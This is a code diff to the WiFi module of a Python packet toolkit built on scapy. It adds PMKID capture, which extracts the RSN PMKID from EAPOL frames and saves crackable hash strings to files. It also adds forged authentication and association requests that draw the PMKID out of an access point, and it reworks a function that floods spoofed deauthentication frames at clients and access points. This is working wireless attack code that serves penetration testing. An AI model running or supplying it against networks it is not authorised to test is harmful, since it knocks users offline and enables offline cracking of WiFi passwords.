@@ -12,12 +12,12 @@ from raw_packet.Utils.base import Base
 from raw_packet.Utils.tm import ThreadManager
 from scapy.all import rdpcap, wrpcap, sendp, Ether, RadioTap
 from scapy.all import Dot11, Dot11FCS, Dot11Elt, Dot11EltRSN, Dot11EltRates, Dot11EltMicrosoftWPA
-from scapy.all import Dot11EltVendorSpecific
+from scapy.all import Dot11EltVendorSpecific, Dot11AssoReq, AKMSuite, Dot11Auth
 from scapy.all import Dot11Beacon, Dot11CCMP, Dot11Deauth, EAPOL
 from typing import Dict, Union, List
 from struct import pack, unpack
 from time import strftime
-from binascii import unhexlify
+from binascii import unhexlify, hexlify
 from subprocess import CompletedProcess, run, PIPE, Popen
 from os import mkdir, listdir, remove
 from os.path import getctime, isdir
@@ -36,7 +36,9 @@ class WiFi:
     # region Public variables
     bssids: Dict[str, Dict[str, Union[int, float, str, bytes, List[Union[int, str]]]]] = dict()
     wpa_handshakes: Dict[str, Dict[str, Dict[str, Union[int, float, str, bytes]]]] = dict()
+    pmkid_authentications: Dict[str, Dict[str, Union[float, int, str, bytes]]] = dict()
     deauth_packets: List[Dict[str, Union[int, float, str]]] = list()
+    association_packets: List[Dict[str, Union[float, str]]] = list()
     channels: List[Dict[str, Union[int, float]]] = list()
     # endregion
 
@@ -79,7 +81,6 @@ class WiFi:
         0x04: "CCMP",
         0x05: "WEP-104"
     }
-
     # endregion
 
     # endregion
@@ -137,7 +138,6 @@ class WiFi:
         except AssertionError as Error:
             self._base.print_error(Error.args[0])
             exit(1)
-
     # endregion
 
     # region Enable monitor mode on interface
@@ -195,7 +195,6 @@ class WiFi:
         else:
             self._base.print_error('This platform: ', self._base.get_platform(), ' is not supported')
             return False
-
     # endregion
 
     # region Switch WiFi channel on interface
@@ -231,7 +230,6 @@ class WiFi:
     @staticmethod
     def _convert_mac(mac_address: str) -> bytes:
         return unhexlify(mac_address.lower().replace(':', ''))
-
     # endregion
 
     # region Parse EAPOL payload
@@ -265,7 +263,23 @@ class WiFi:
 
         except AssertionError:
             return None
+    # endregion
 
+    # region Extract RSN PMKID
+    @staticmethod
+    def _extract_rsn_pmkid(wpa_key_data: bytes) -> Union[None, bytes]:
+        try:
+            assert len(wpa_key_data) >= 22, 'Bad length WPA Key Data'
+            wpa_key_data_header = unpack('2B', wpa_key_data[:2])
+            tag_number: int = int(wpa_key_data_header[0])
+            tag_length: int = int(wpa_key_data_header[1])
+            oui: bytes = wpa_key_data[3:5]
+            oui_type: bytes = wpa_key_data[5:6]
+            assert tag_length + 2 == len(wpa_key_data), 'Bad length RSN PMKID'
+            return wpa_key_data[6:]
+
+        except AssertionError:
+            return None
     # endregion
 
     # region Analyze 802.11 packet
@@ -302,7 +316,7 @@ class WiFi:
                     self.bssids[packet[Dot11FCS].addr2]['cipher list']: List[str] = list()
 
                 # Next Beacon frame
-                elif self.bssids[packet[Dot11FCS].addr2]['packets'] > 10:
+                elif self.bssids[packet[Dot11FCS].addr2]['packets'] > 5:
 
                     # Choose the average value of the Signal
                     self.bssids[packet[Dot11FCS].addr2]['signal']: int = \
@@ -404,8 +418,6 @@ class WiFi:
             # endregion
 
             # region 802.11 CCMP and Direction: Client -> AP (from Client to AP)
-            test = packet
-            test = 1
             if packet.haslayer(Dot11CCMP) and \
                     packet[Dot11FCS].type == 2 and \
                     packet[Dot11FCS].subtype == 8 and \
@@ -419,6 +431,45 @@ class WiFi:
                     self.bssids[packet[Dot11FCS].addr1]: \
                         Dict[str, Union[int, float, str, bytes, List[Union[int, str]]]] = dict()
                     self.bssids[packet[Dot11FCS].addr1]['clients']: List[str] = list([packet[Dot11FCS].addr2])
+            # endregion
+
+            # region EAPOL RSN PMKID
+            if packet.haslayer(EAPOL) and \
+                    packet[Dot11FCS].type == 2 and \
+                    (packet[Dot11FCS].subtype == 8 or
+                     packet[Dot11FCS].subtype == 0) and \
+                    packet[Dot11FCS].FCfield.value % 2 == 0 and \
+                    packet[Dot11FCS].addr1 != packet[Dot11FCS].addr2 and \
+                    packet[Dot11FCS].addr2 == packet[Dot11FCS].addr3:
+
+                eapol: Union[None, Dict[str, Union[int, bytes]]] = self._parse_eapol(packet[EAPOL].original)
+                bssid: str = packet[Dot11FCS].addr2
+                client: str = packet[Dot11FCS].addr1
+
+                if bssid not in self.pmkid_authentications.keys() and eapol['wpa key data'] != b'':
+                    self.pmkid_authentications[bssid]: Dict[str, Union[float, int, str, bytes]] = dict()
+                    rsn_pmkid: Union[None, bytes] = self._extract_rsn_pmkid(eapol['wpa key data'])
+                    assert rsn_pmkid is not None, 'Bad RSN PMKID'
+                    pmkid_content: bytes = hexlify(rsn_pmkid) + b'*'
+                    pmkid_content += hexlify(self._convert_mac(bssid)) + b'*'
+                    pmkid_content += hexlify(self._convert_mac(client)) + b'*'
+                    essid: str = 'Imladris'
+                    if bssid in self.bssids.keys():
+                        if 'essid' in self.bssids[bssid].keys():
+                            essid = self.bssids[bssid]['essid']
+                    pmkid_content += hexlify(essid.encode()) + b'.'
+                    self.pmkid_authentications[bssid]['content']: bytes = pmkid_content
+                    self.pmkid_authentications[bssid]['timestamp']: datetime = datetime.utcnow().timestamp()
+                    self.pmkid_authentications[bssid]['key version']: int = int(packet[EAPOL].version)
+                    self.pmkid_authentications[bssid]['client']: str = client
+                    self.pmkid_authentications[bssid]['essid']: str = essid
+                    self.pmkid_authentications[bssid]['file']: str = \
+                        'wpa' + str(packet[EAPOL].version) + \
+                        '_' + bssid.replace(':', '') + \
+                        '_' + client.replace(':', '') + \
+                        '_' + strftime('%Y%m%d_%H%M%S') + '.pmkid'
+                    with open(self.pmkid_authentications[bssid]['file'], 'wb') as pmkid_file:
+                        pmkid_file.write(self.pmkid_authentications[bssid]['content'])
             # endregion
 
             # region EAPOL Message 1 of 4
@@ -665,7 +716,6 @@ class WiFi:
             Popen([tshark_command], shell=True, stdout=PIPE, stderr=PIPE)
 
         return True
-
     # endregion
 
     # region Read pcap files from directory
@@ -714,7 +764,6 @@ class WiFi:
             # Wait one second
             else:
                 sleep(1)
-
     # endregion
 
     # region Scan WiFi channels and search AP ssids
@@ -726,7 +775,6 @@ class WiFi:
                     sleep(5)
             else:
                 sleep(2)
-
     # endregion
 
     # endregion
@@ -752,28 +800,84 @@ class WiFi:
     def send_deauth(self,
                     bssid: str = '01:23:45:67:89:0a',
                     client: str = '01:23:45:67:89:0b',
-                    number_of_deauth_packets: int = 50) -> None:
+                    number_of_deauth_packets: Union[None, int] = None,
+                    wireless_interface: Union[None, str] = None) -> None:
         """
         Sending 802.11 deauth packets
         :param bssid: BSSID (example: '01:23:45:67:89:0a')
         :param client: A client MAC address for deauth (example: '01:23:45:67:89:0b')
         :param number_of_deauth_packets: The number of deauth packets for one iteration (default: 50)
+        :param wireless_interface: Wireless interface name (example: 'wlan0')
         :return: None
         """
-        client_deauth_packet: bytes = RadioTap() / \
-                                      Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
-                                      Dot11Deauth(reason=7)
-        ap_deauth_packet: bytes = RadioTap() / \
-                                  Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=bssid) / \
-                                  Dot11Deauth(reason=7)
+        if wireless_interface is None:
+            wireless_interface = self._interface
+
+        if number_of_deauth_packets is None:
+            number_of_deauth_packets = 50
+
+        client_deauth_packet: bytes = \
+            RadioTap() / \
+            Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
+            Dot11Deauth(reason=7)
+
+        ap_deauth_packet: bytes = \
+            RadioTap() / \
+            Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=bssid) / \
+            Dot11Deauth(reason=7)
 
         for _ in range(int(number_of_deauth_packets / 2)):
-            sendp(client_deauth_packet, iface=self._interface, monitor=True, verbose=False)
-            sendp(ap_deauth_packet, iface=self._interface, monitor=True, verbose=False)
+            sendp(client_deauth_packet, iface=wireless_interface, monitor=True, verbose=False)
+            sendp(ap_deauth_packet, iface=wireless_interface, monitor=True, verbose=False)
 
         self.deauth_packets.append({'packets': number_of_deauth_packets,
                                     'bssid': bssid, 'client': client,
                                     'timestamp': datetime.utcnow().timestamp()})
+    # endregion
+
+    # region Sending association request packet
+    def send_association_request(self,
+                                 bssid: str = '01:23:45:67:89:0a',
+                                 essid: str = 'AP_NAME',
+                                 number_of_association_packets: Union[None, int] = None,
+                                 wireless_interface: Union[None, str] = None) -> None:
+        """
+        Sending 802.11 Association request
+        :param bssid: BSSID (example: '01:23:45:67:89:0a')
+        :param essid: ESSID (example: 'AP_NAME')
+        :param number_of_association_packets: The number of association packets for one iteration (default: 3)
+        :param wireless_interface: Wireless interface name (example: 'wlan0')
+        :return:
+        """
+        if wireless_interface is None:
+            wireless_interface = self._interface
+
+        if number_of_association_packets is None:
+            number_of_association_packets = 3
+
+        client = self._base.get_interface_mac_address(interface_name=wireless_interface)
+
+        auth_request_packet: bytes = \
+            RadioTap() / \
+            Dot11(addr1=bssid, addr2=client, addr3=bssid, SC=16, ID=0x3a01) / \
+            Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
+
+        assoc_request_packet: bytes = \
+            RadioTap() / \
+            Dot11(type=0, subtype=0, addr1=bssid, addr2=client, addr3=bssid, SC=16, ID=0x3a01) / \
+            Dot11AssoReq(cap=0x1104, listen_interval=0x0003) / \
+            Dot11Elt(ID=0, info=essid) / \
+            Dot11EltRates(rates=[0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c]) / \
+            Dot11EltRSN(akm_suites=AKMSuite(oui=0x000fac, suite=0x02), mfp_capable=1, ptksa_replay_counter=3)
+
+        sendp(auth_request_packet, iface=wireless_interface, monitor=True, verbose=False)
+        sleep(0.5)
+        for _ in range(number_of_association_packets):
+            sendp(assoc_request_packet, iface=wireless_interface, monitor=True, verbose=False)
+            sleep(0.1)
+
+        self.association_packets.append({'bssid': bssid, 'essid': essid, 'client': client,
+                                         'timestamp': datetime.utcnow().timestamp()})
     # endregion
 
     # endregion
